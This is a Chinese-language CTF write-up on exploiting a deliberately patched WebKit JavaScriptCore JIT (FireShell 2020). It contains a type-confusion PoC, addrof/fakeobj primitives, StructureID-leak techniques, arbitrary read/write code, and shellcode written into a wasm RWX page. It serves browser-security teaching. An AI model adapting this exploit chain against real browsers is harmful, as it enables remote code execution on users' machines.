# FireShell2020——从一道ctf题入门jsc利用

阅读量 **263705**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-12-01 14:30:18

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t01531f61f08c5dbd82.png)

## 前言

###  环境搭建

编译webkit

    
    
    sudo apt install libicu-dev python ruby bison flex cmake build-essential ninja-build git gperf
    git clone --depth=1 https://github.com/WebKit/webkit
    git fetch --unshallow
    Tools/gtk/install-dependencies
    Tools/Scripts/set-webkit-configuration --asan  // 配置asan
    Tools/Scripts/build-webkit --jsc-only --debug
    Tools/Scripts/build-webkit --jsc-only --release
    

编译题目环境：

    
    
    git checkout 830f2e892431f6fea022f09f70f2f187950267b7
    cd Source/JavaScriptCore/dfg
    cp DFGAbstractInterpreterInlines.h DFGAbstractInterpreterInlines__patch.h
    git apply < ./patch.diff
    cp DFGAbstractInterpreterInlines__patch.h DFGAbstractInterpreterInlines.h
    cd ../../../
    Tools/Scripts/build-webkit --jsc-only --release
    

启动运行jsc：

    
    
    ./jsc --useConcurrentJIT=false ./exp.js
    

###  打断点的三种方式

（1）定义下面函数，在利用代码中调用，gdb调试中对arrayProtoFuncSlice下断点

    
    
    function b(){
        Array.prototype.slice([]);    //needs "b arrayProtoFuncSlice"
    }
    

（2）在利用代码中添加readline();，等待输入，就可以在gdb中断下

（3） 修改jsc的源码添加如下辅助函数

    
    
    diff --git diff --git a/Source/JavaScriptCore/jsc.cpp b/Source/JavaScriptCore/jsc.cpp
    index bda9a09d0d2..d359518b9b6 100644
    --- a/Source/JavaScriptCore/jsc.cpp
    +++ b/Source/JavaScriptCore/jsc.cpp
    @@ -994,6 +994,7 @@ static EncodedJSValue JSC_HOST_CALL functionSetHiddenValue(ExecState*);
     static EncodedJSValue JSC_HOST_CALL functionPrintStdOut(ExecState*);
     static EncodedJSValue JSC_HOST_CALL functionPrintStdErr(ExecState*);
     static EncodedJSValue JSC_HOST_CALL functionDebug(ExecState*);
    +static EncodedJSValue JSC_HOST_CALL functionDbg(ExecState*);
     static EncodedJSValue JSC_HOST_CALL functionDescribe(ExecState*);
     static EncodedJSValue JSC_HOST_CALL functionDescribeArray(ExecState*);
     static EncodedJSValue JSC_HOST_CALL functionSleepSeconds(ExecState*);
    @@ -1218,6 +1219,7 @@ protected:
    
             addFunction(vm, "debug", functionDebug, 1);
             addFunction(vm, "describe", functionDescribe, 1);
    +        addFunction(vm, "dbg", functionDbg, 0);
             addFunction(vm, "describeArray", functionDescribeArray, 1);
             addFunction(vm, "print", functionPrintStdOut, 1);
             addFunction(vm, "printErr", functionPrintStdErr, 1);
    @@ -1752,6 +1754,13 @@ EncodedJSValue JSC_HOST_CALL functionDebug(ExecState* exec)
         return JSValue::encode(jsUndefined());
     }
    
    +EncodedJSValue JSC_HOST_CALL functionDbg(ExecState* exec)
    +{
    +       asm("int3;");
    +
    +       return JSValue::encode(jsUndefined());
    +}
    +
     EncodedJSValue JSC_HOST_CALL functionDescribe(ExecState* exec)
     {
         if (exec->argumentCount() < 1)
    

###  基础知识

jsc中类型的表示是通过高16位来区分的，剩下的48位用来表示地址，具体如下：

    
    
    Pointer： [0000][xxxx:xxxx:xxxx]（前两个字节为0，后六个字节寻址）
    Double： [0001～FFFE][xxxx:xxxx:xxxx]
    Intger： [FFFF][0000:xxxx:xxxx]（只有低四个字节表示数字）
    False： [0000:0000:0000:0006]
    True： [0000:0000:0000:0007]
    Undefined： [0000:0000:0000:000a]
    Null： [0000:0000:0000:0002]
    

jsc中对象中及其属性的内存分布（Butterfly）：

    
    
    --------------------------------------------------------    .. | propY | propX | length | elem0 | elem1 | elem2 | ..
    --------------------------------------------------------                                ^
                                |
                +---------------+
                |
      +-------------+
      | Some Object |
      +-------------+
    

Butterfly指针指向的是属性值和元素值的中间，属性值保存在左边（低地址处），元素值保存在右边，同时左边还保存着元素的个数length。

对象的属性个数超过默认值6时，JSC就会为对象创建一个Butterfly来存储属性的值。属性少于6个时，会以inline的方式存储，如下：

![](https://p0.ssl.qhimg.com/t017818a7fc6b89eedf.png)

## 漏洞分析

题目补丁：

DFGAbstractInterpreterInlines.h

    
    
    --- DFGAbstractInterpreterInlines.h     2020-03-19 13:12:31.165313000 -0700
    +++ DFGAbstractInterpreterInlines__patch.h      2020-03-16 10:34:40.464185700 -0700
    @@ -1779,10 +1779,10 @@
         case CompareGreater:
         case CompareGreaterEq:
         case CompareEq: {
    -        bool isClobbering = node->isBinaryUseKind(UntypedUse);
    +    //    bool isClobbering = node->isBinaryUseKind(UntypedUse);
    
    -        if (isClobbering)
    -            didFoldClobberWorld();
    +   //     if (isClobbering)
    +   //         didFoldClobberWorld();
    
             JSValue leftConst = forNode(node->child1()).value();
             JSValue rightConst = forNode(node->child2()).value();
    @@ -1905,8 +1905,8 @@
                 }
             }
    
    -        if (isClobbering)
    -            clobberWorld();
    +    //    if (isClobbering)
    +    //        clobberWorld();
             setNonCellTypeForNode(node, SpecBoolean);
             break;
         }
    

jsc优化的四个阶段：

![](https://p2.ssl.qhimg.com/t01eb136fbe7f566165.png)

DFG积极地基于前面(baseline JIT&Interpreter)收集的数据进行类型推测，这样就可以尽早获得类型信息(forward-propagate type
information)，从而减少了大量的类型检查。如果推测失败，DFG取消优化(Deoptimization)，也称为”OSR exit”.

同时该阶段优化也要确保优化不会去除一些可能溢出的边界检查，实现在DFGAbstractInterpreterInlines.h，里面包含一个executeEffects函数用于检查一个操作对后续的优化是否安全，如果不安全，就会调用clobberWorld
函数取消对所有数组类型的推测，表明该优化操作是有风险的。

    
    
    // JavascriptCore/dfg/DFGAbstractInterpreterInlines.h
    template <typename AbstractStateType>
    void AbstractInterpreter<AbstractStateType>::clobberWorld()
    {
        clobberStructures();
    }
    // JavascriptCore/dfg/DFGAbstractInterpreterInlines.h
    template <typename AbstractStateType>
    void AbstractInterpreter<AbstractStateType>::clobberStructures()
    {
        m_state.clobberStructures();
        m_state.mergeClobberState(AbstractInterpreterClobberState::ClobberedStructures);
        m_state.setStructureClobberState(StructuresAreClobbered);
    }
    

而题目补丁就是将CompareEq操作中clobberWorld
检查去除，简单来说就是CompareEq操作中不会检查对象的类型转换，会直接按照优化结果处理，poc 代码如下：

    
    
    var arr = [1.1, 2.2, 3.3];
    arr['a'] = 1;
    
    var go = function(a, c) {
        a[0] = 1.1;
        a[1] = 2.2;
        c == 1;
        a[2] = 5.67070584648226e-310;
    }
    
    for(var i = 0; i < 0x100000; i++) {
        go(arr, {})
    }
    
    go(arr, {
        toString:() => {
            arr[0] = {};
            return '1';
        }
    });
    "" + arr[2];
    

调用toString时，在执行到”c ==
1”前，a的类型为ArrayWithDouble，通过执行arr[0]={}，a的类型变为ArrayWithContiguous，而JIT并没有对类型的转化进行检查，所以执行完”c
==
1”后，依旧认为a的类型为ArrayWithDouble，而实际此时a类型为ArrayWithContiguous，造成类型混淆，浮点数就被当作是一个对象指针。最后””
+ arr[2]; 指针加上字符导致crash。

执行toString前后，arr数组类型从ArrayWithDouble变成ArrayWithContiguous：

    
    
    执行toString 前：
    Object: 0x7fc1b3faeee8 with butterfly 0x7fb85b7f83a8 (Structure 0x7fc173bfb4e0:[0x9ce, Array, {a:100}, ArrayWithDouble, Proto:0x7fc1b3fb70e8, Leaf]), StructureID: 2510
    执行toString 后：
    Object: 0x7fc1b3faeee8 with butterfly 0x7fb85b7f83a8 (Structure 0x7fc173bfbde0:[0xb5a4, Array, {a:100}, ArrayWithContiguous, Proto:0x7fc1b3fb70e8, Leaf]), StructureID: 46500
    

## 漏洞利用

jsc漏洞的利用的一般流程是：

（1）利用漏洞构造addrof和fakeobj原语

（2）绕过StructureID随机化

（3）构造任意地址读写

（4）查找wasm rwx区域，写入shellcode，完成利用

###  构造addrof和fakeobj原语

根据poc可以构造出构造addrof和fakeobj原语：

    
    
    function AddrOfFoo(arr, cmpObj)
    {
        arr[1] = 1.1;
        cmpObj == 2.2; 
        return arr[0];
    }
    
    for( let i=0; i<MAX_ITERATIONS; i++ ) {
        AddrOfFoo(arr, {});
    }
    
    function AddrOf(obj) {
    
    
        let arr = new Array(noCoW, 2,2, 3.3);
        let evil = {
            toString: () => {
                arr[0] = obj;
            }
        }
        let addr = AddrOfFoo(arr, evil);
        return f2i(addr);
    }
    
    
    function FakeObjFoo(arr, cmpObj, addr)
    {
        arr[1] = 1.1;
        cmpObj == 2.2;  
        arr[0] = addr;
    }
    
    for( let i=0; i<MAX_ITERATIONS; i++ ) {
        FakeObjFoo(arr, {}, 1.1);
    }
    
    function FakeObj(addr) {
    
        addr = i2f(addr);
        let arr = new Array(noCoW, 2.2, 3.3);
        let evil = {
            toString: () => {
                arr[0] = {};
            }
        }
        FakeObjFoo(arr, evil, addr);
        return arr[0];
    }
    

接下来是绕过StructureID随机化，JSC里面并不是所有的内建函数，机制都依赖正确的structureID，我们可以通过不验证structureID的调用路径进行伪造，泄露的正常的structureID。

###  泄露StructureID方法一

当加载JSArray的元素时，解释器中有一个代码路径，它永远不会访问StructureID:

    
    
    static ALWAYS_INLINE JSValue getByVal(VM& vm, JSValue baseValue, JSValue subscript)
    {
        ...;
        if (subscript.isUInt32()) {
            uint32_t i = subscript.asUInt32();
            if (baseValue.isObject()) {
                JSObject* object = asObject(baseValue);
                if (object->canGetIndexQuickly(i))
                    return object->getIndexQuickly(i); // 【1】
    

getIndexQuickly直接从butterfly加载元素，而canGetIndexQuickly只查看JSCell头部中的索引类型和butterfly中的length：

    
    
    bool canGetIndexQuickly(unsigned i) const {
        const Butterfly* butterfly = this->butterfly();
        switch (indexingType()) {
        ...;
        case ALL_CONTIGUOUS_INDEXING_TYPES:
            return i < butterfly->vectorLength() && butterfly->contiguous().at(this, i);
    }
    

我们可以伪造一个JSArray对象，填充无效的StructureID等头部字段（因为getByVal路径上不验证，所以不会报错），然后将butterfly填充为要泄露的目标对象地址，就可以将目标对象的结构当成数据输出。

![](https://p1.ssl.qhimg.com/t01ebf6c97d96648247.png)

泄露StructureID的代码如下：

    
    
    // leak entropy by getByVal
    function LeakStructureID(obj)
    {
        let container = {
            cellHeader: i2obj(0x0108230700000000), // 伪造的JSArray头部，包括StructureID等字段
            butterfly: obj
        };
    
        let fakeObjAddr = AddrOf(container) + 0x10;
        let fakeObj = FakeObj(fakeObjAddr);
        f64[0] = fakeObj[0];// 访问元素会调用getByVal
    
        //此时fakeObj[0]为Legitimate JSArray的JSCell，fakeObj[1]为Legitimate JSArray的butterfly
        // repair the fakeObj's jscell
        let structureID = u32[0];
        u32[1] = 0x01082307 - 0x20000;
        container.cellHeader = f64[0];
    
        return structureID;
    }
    

内存布局如下：

    
    
    // container 对象：
    Object: 0x7fe0cc78c000 with butterfly (nil) (Structure 0x7fe0cc7bfde0:[0xd0bd, Object, {cellHeader:0, butterfly:1}, NonArray, Proto:0x7fe10cbf6de8, Leaf]), StructureID: 53437
    
        pwndbg> x/4gx 0x7fe0cc78c000
    0x7fe0cc78c000:    0x010018000000d0bd    0x0000000000000000
    0x7fe0cc78c010:    0x0108230700000000    0x00007fe10cb7cae8 // <---伪造的Butterfly，覆盖成目标对象地址
                  // 伪造的JSCell
    pwndbg> x/gx 0x00007fe10cb7cae8
    0x7fe10cb7cae8:    0x010823070000f1aa // <---- StructureID被当作数据输出
    

###  泄露StructureID方法二

我们可以通过 toString() 函数原型的调用链来实现泄露StructureID。具体见下面的例子：

    
    
    function f() {
        return "hello world";
    }
    print(Function.prototype.toString.call(f));
    
    // 会输出源代码
    function f() {
        return "hello world";
    }
    

Function.prototype.toString() 方法用于返回一个表示当前函数源代码的字符串，对于内置函数，往往返回一个类似“[native
code] ”的字符串作为函数体。它调用链如下：

    
    
    EncodedJSValue JSC_HOST_CALL functionProtoFuncToString(JSGlobalObject* globalObject, CallFrame* callFrame)
    {
        VM& vm = globalObject->vm();
        auto scope = DECLARE_THROW_SCOPE(vm);
        JSValue thisValue = callFrame->thisValue();
        if (thisValue.inherits<JSFunction>(vm)) {
            JSFunction* function = jsCast<JSFunction*>(thisValue);
            if (function->isHostOrBuiltinFunction())
                RELEASE_AND_RETURN(scope, JSValue::encode(jsMakeNontrivialString(globalObject, "function ", function->name(vm), "() {\n[native code]\n}"))); // 【1】
            FunctionExecutable* executable = function->jsExecutable();
            if (executable->isClass())
                return JSValue::encode(jsString(vm, executable->classSource().view().toString()));
            …
    

【1】处会调用function->name 来获取函数名，具体调用到JSFunction::name 函数：

    
    
    String JSFunction::name(VM& vm)
    {
        …
        const Identifier identifier = jsExecutable()->name();
        if (identifier == vm.propertyNames->builtinNames().starDefaultPrivateName())
            return emptyString();
        return identifier.string(); // 【2】
    }
    inline FunctionExecutable* JSFunction::jsExecutable() const
    {
        ASSERT(!isHostFunctionNonInline());
        return static_cast<FunctionExecutable*>(m_executable.get());
    }
    

【2】处Identifier String 保存着指向函数名的指针， identifier.string()返回函数名的字符串。对应的结构寻址过程如下：

![](https://p0.ssl.qhimg.com/t019b5e367ab9f96241.png)

用gdb调试例子，为了直观展示函数名，将函数名定义为AAAAA：

    
    
    function AAAAA(){
            return "hellow";
    }
    print(describe(AAAAA));
    print(Function.prototype.toString.call(AAAAA));
    

内存布局如下：

    
    
    Object: 0x7fd3390f5900 with butterfly (nil) (Structure 0x7fd3390f9140:[0xde6e, Function, {}, NonArray, Proto:0x7fd3794c11a8, Leaf]), StructureID: 56942
    
    pwndbg> x/6gx 0x7fd3390f5900 //函数AAAAA的对象结构地址 (JSFunction object)
    0x7fd3390f5900:    0x000e1a000000de6e    0x0000000000000000
    0x7fd3390f5910:    0x00007fd3794bd118    0x00007fd3390e5200 // <----- ExecutableBase
    0x7fd3390f5920:    0x000e1a000000de6e    0x0000000000000000
    pwndbg> x/12gx 0x00007fd3390e5200 // (FunctionExecutable)
    0x7fd3390e5200:    0x00000c0000006253    0x0000000000000000
    0x7fd3390e5210:    0x0000000000000000    0x0000000000000000
    0x7fd3390e5220:    0x0000000000000000    0x00007fd3794a8000
    0x7fd3390e5230:    0x0000018700000170    0x0000000e0000001a
    0x7fd3390e5240:    0x0000200000000000    0x0000000000000000
    0x7fd3390e5250:    0x00007fd3794a7068    0x00007fd3390e8d80 // <-------UnlinkedFunctionExecutable
    pwndbg> x/10gx 0x00007fd3390e8d80 // (UnlinkedFunctionExecutable)
    0x7fd3390e8d80:    0x00000d000000d77e    0x000000020000001a
    0x7fd3390e8d90:    0x0000000e0000016b    0x0000017000000000
    0x7fd3390e8da0:    0x0000017080000017    0x0000018600000162
    0x7fd3390e8db0:    0x0400000000000000    0x0000000000000000
    0x7fd3390e8dc0:    0x0000000000000000    0x00007fd3794aa6c0 // <--------Identifier
    pwndbg> x/10gx 0x00007fd3794aa6c0 //(Identifier String)
    0x7fd3794aa6c0:    0x000000050000000a    0x00007fd3794aa6d4 // Pointer
                //        Flag| Length
    0x7fd3794aa6d0:    0x414141413aace614    0x0000000000000041
    pwndbg> x/10gx 0x00007fd3794aa6d4 // 执行函数名的指针
    0x7fd3794aa6d4:    0x0000004141414141    0x0000000200000000
                         // 函数名AAAAA
    

因此根据上述的寻址过程我们可以伪造上述 JSFunction
object、FunctionExecutable、UnlinkedFunctionExecutable、Identifier
String四个结构，最终Identifier String 的Pointer
指向structureID的地址，就可以将structureID当成函数名，以字符串的形式输出，达到泄露的目的。

伪造的寻址过程如下：

![](https://p3.ssl.qhimg.com/t014cacc6cd85b2d492.png)

上图是将JSFunction object 和 Identifier String 蹂在一个结构里进行伪造了，泄露structureID代码如下：

    
    
    function LeakStructureID(obj)
    {
        // https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf
    
        var unlinkedFunctionExecutable = {
            m_isBuitinFunction: i2f(0xdeadbeef),
            pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6,
            m_identifier: {},
        };
    
        var fakeFunctionExecutable = {
          pad0: 0, pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6, pad7: 7, pad8: 8,
          m_executable: unlinkedFunctionExecutable,
        };
    
        var container = {
          jscell: i2f(0x00001a0000000000),
          butterfly: {},
          pad: 0,
          m_functionExecutable: fakeFunctionExecutable,
        };
    
    
        let fakeObjAddr = AddrOf(container) + 0x10;
        let fakeObj = FakeObj(fakeObjAddr);
    
        unlinkedFunctionExecutable.m_identifier = fakeObj;
        container.butterfly = arrLeak; // 伪造Identifier String 的Pointer为泄露的目标对象arrLeak
    
        var nameStr = Function.prototype.toString.call(fakeObj);
    
        let structureID = nameStr.charCodeAt(9);
    
        // repair the fakeObj's jscell
        u32[0] = structureID;
        u32[1] = 0x01082309-0x20000;
        container.jscell = f64[0];
        return structureID;
    }
    

内存布局如下：

    
    
    // 要泄露的目标对象 arrLeak
    Object: 0x7f32c0569ae8 with butterfly 0x7f284cdd40a8 (Structure 0x7f32801f9800:[0xb0e4, Array, {}, ArrayWithDouble, Proto:0x7f32c05b70e8]), StructureID: 45284 
    
    //container 对象：    
    Object: 0x7f3280180000 with butterfly (nil) (Structure 0x7f32801bf540:[0x611b, Object, {jscell:0, butterfly:1, pad:2, m_functionExecutable:3}, NonArray, Proto:0x7f32c05f6de8, Leaf]), StructureID: 24859
    
    fakeObjAddr: 0x00007f3280180010
    
    // fakeFunctionExecutable 对象：
    Object: 0x7f3280184000 with butterfly (nil) (Structure 0x7f32801bf6c0:[0x2a4e, Object, {pad0:0, pad1:1, pad2:2, pad3:3, pad4:4, pad5:5, pad6:6, pad7:7, pad8:8, m_executable:9}, NonArray, Proto:0x7f32c05f6de8, Leaf]), StructureID: 10830
    
    // unlinkedFunctionExecutable 对象：
    Object: 0x7f3280188000 with butterfly (nil) (Structure 0x7f32801bfa80:[0x32be, Object, {m_isBuitinFunction:0, pad1:1, pad2:2, pad3:3, pad4:4, pad5:5, pad6:6, m_identifier:7}, NonArray, Proto:0x7f32c05f6de8, Leaf]), StructureID: 12990
    
    pwndbg> x/6gx 0x00007f3280180010  // fakeObj
    0x7f3280180010:    0x00021a0000000000    0x00007f32c0569ae8
    0x7f3280180020:    0xfffe000000000000    0x00007f3280184000  // <----- fakeFunctionExecutable
    0x7f3280180030:    0x0000000000000000    0x0000000000000000
    pwndbg> x/12gx 0x00007f3280184000
    0x7f3280184000:    0x0100180000002a4e    0x0000000000000000
    0x7f3280184010:    0xfffe000000000000    0xfffe000000000001
    0x7f3280184020:    0xfffe000000000002    0xfffe000000000003
    0x7f3280184030:    0xfffe000000000004    0xfffe000000000005
    0x7f3280184040:    0xfffe000000000006    0xfffe000000000007
    0x7f3280184050:    0xfffe000000000008    0x00007f3280188000 // <------ unlinkedFunctionExecutable 
    pwndbg> x/10gx 0x00007f3280188000
    0x7f3280188000:    0x01001800000032be    0x0000000000000000
    0x7f3280188010:    0x00020000deadbeef    0xfffe000000000001
    0x7f3280188020:    0xfffe000000000002    0xfffe000000000003
    0x7f3280188030:    0xfffe000000000004    0xfffe000000000005
    0x7f3280188040:    0xfffe000000000006    0x00007f3280180010 // unlinkedFunctionExecutable.m_identifier -> 覆盖成fakeObj;
    pwndbg> x/2gx 0x00007f3280180010
    0x7f3280180010:    0x00021a0000000000    0x00007f32c0569ae8// Pointer -> 覆盖成要泄露的目标对象arrLeak地址
                //        Flag| Length
    pwndbg> x/wx 0x00007f32c0569ae8
    0x7f32c0569ae8:    0x0000b0e4 // <---- 对象的第一个字段就是StructureID，此时被当成函数名输出
    

最后structureID取nameStr.charCodeAt(9)是因为Function.prototype.toString.call
返回的是整个函数源码，开头为”function “，占去前9个字符。所以第10个字符为函数名。

###  构造任意读写

泄露StructureID后，我们可以仿造泄露StructureID方法一那样构造一个JSArray，只不过现在StructureID填充的是有效的，可以根据Butterfly进行读写。

（1）首先伪造一个driver object，类型为对象类型数组，将driver object 的butterfly 指向victim
object，此时访问driver[1]就可以访问victim
object的butterfly，之后申请一个ArrayWithDouble（浮点数类型）的数组unboxed，通过driver[1] = unboxed
将victim object的butterfly填充为unboxed对象地址，同理此时访问victim[1]就可以访问unboxed object
的butterfly。

![](https://p2.ssl.qhimg.com/t01347289562b8c2f9f.png)

这一步我们可以泄露unboxed object的butterfly内容。代码如下：

    
    
    var victim = [noCoW, 14.47, 15.57];
    victim['prop'] = 13.37;
    victim['prop_0'] = 13.37;
    
    u32[0] = structureID;
    u32[1] = 0x01082309-0x20000;
    var container = {
        cellHeader: f64[0],
        butterfly: victim   
    };
    // build fake driver
    var containerAddr = AddrOf(container);
    var fakeArrAddr = containerAddr + 0x10;
    var driver = FakeObj(fakeArrAddr);
    
    // ArrayWithDouble
    var unboxed = [noCoW, 13.37, 13.37];
    
    // leak unboxed butterfly's addr
    driver[1] = unboxed;
    var sharedButterfly = victim[1];
    print("[+] shared butterfly addr: " + hex(f2i(sharedButterfly)));
    

（2）申请一个ArrayWithContiguous（对象类型）的数组boxed，和第一步一样，将driver[1]覆盖成boxed
object地址就可以通过victim[1] 对boxed object的butterfly进行操作。将第一步泄露的unboxed object
butterfly内容填充到boxed object的butterfly，这样两个对象操作的就是同一个butterfly，可以方便构造新的addrof 和
fakeobj原语。

![](https://p1.ssl.qhimg.com/t01439fdb8b5d9b7bed.png)

代码如下：

    
    
    var boxed = [{}];
    driver[1] = boxed;
    victim[1] = sharedButterfly;
    
    function NewAddrOf(obj) {
        boxed[0] = obj;
        return f2i(unboxed[0]);
    }
    
    function NewFakeObj(addr) {
        unboxed[0] = i2f(addr);
        return boxed[0];            
    }
    

（3）将driver object的类型修改成浮点型数组类型，将victim object 的butterfly
修改成target_addr+0x10，因为butterfly是指向length和elem0中间，而属性1prop位于butterfly-0x10的位置，访问victim.prop相当于访问butterfly-0x10
=（target_addr+0x10）-0x10=target_addr。

![](https://p0.ssl.qhimg.com/t01df42ea39ea996a71.png)

所以通过读写victim.prop就可以实现任意地址的读写，代码如下：

    
    
    function Read64(addr) {
        driver[1] = i2f(addr+0x10);
        return NewAddrOf(victim.prop);
    }
    
    function Write64(addr, val) {
        driver[1] = i2f(addr+0x10);
        victim.prop = i2f(val);
    }
    

###  任意代码执行

和v8的利用相似，通过任意读查找wasm_function中rwx区域，通过任意写将shellcode写入该区域即可执行任意代码：

    
    
    let wasmObjAddr = NewAddrOf(wasmFunc);
    let codeAddr = Read64(wasmObjAddr + 0x38);
    let rwxAddr = Read64(codeAddr);
    print("[+] rwx addr: " + hex(rwxAddr));
    
    var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
        96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
        105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
        72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
        72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
        184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
        94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
    // write shellcode to rwx mem
    ArbitraryWrite(rwxAddr, shellcode);
    
    // trigger shellcode to execute
    wasmFunc();
    

exp 代码：<https://github.com/ray-cp/browser_pwn/blob/master/jsc_pwn/FireShell-ctf-2020-The-Return-of-the-Side-Effect/exp.js>

执行效果如下：

![](https://p4.ssl.qhimg.com/t01273c82cb50b7fa25.png)

## 参考链接

题目环境下载：<https://github.com/De4dCr0w/Browser-pwn/tree/master/Vulnerability%20analyze/FireShell-ctf-2020-The-Return-of-the-Side-Effect>

基础知识及环境搭建：<https://www.anquanke.com/post/id/183804>

gdb和lldb指令对比：<https://lldb.llvm.org/use/map.html>

<https://github.com/ray-cp/browser_pwn/tree/master/jsc_pwn/FireShell-ctf-2020-The-Return-of-the-Side-Effect>

<https://ptr-yudai.hatenablog.com/entry/2020/03/23/105837>

<https://www.thezdi.com/blog/2018/4/12/inverting-your-assumptions-a-guide-to-jit-comparisons>

<https://ptr-yudai.hatenablog.com/entry/2020/03/23/105837>

CVE-2016-4622调试笔记：

<http://turingh.github.io/2016/12/03/CVE-2016-4622%E8%B0%83%E8%AF%95%E7%AC%94%E8%AE%B0/>

WEBKIT JAVASCRIPTCORE的特殊调试技巧：

<https://dwfault.github.io/2019/12/20/WebKit%20JavaScriptCore%E7%9A%84%E7%89%B9%E6%AE%8A%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/>

<https://googleprojectzero.blogspot.com/2020/09/jitsploitation-two.html>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **De4dCr0w** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/223494](/post/id/223494)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [浏览器](/tag/浏览器)
  * [Pwn](/tag/Pwn)

 **+1** __6赞

 __收藏

![](https://p1.ssl.qhimg.com/t013e0dbeefc3997c0c.png) De4dCr0w

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

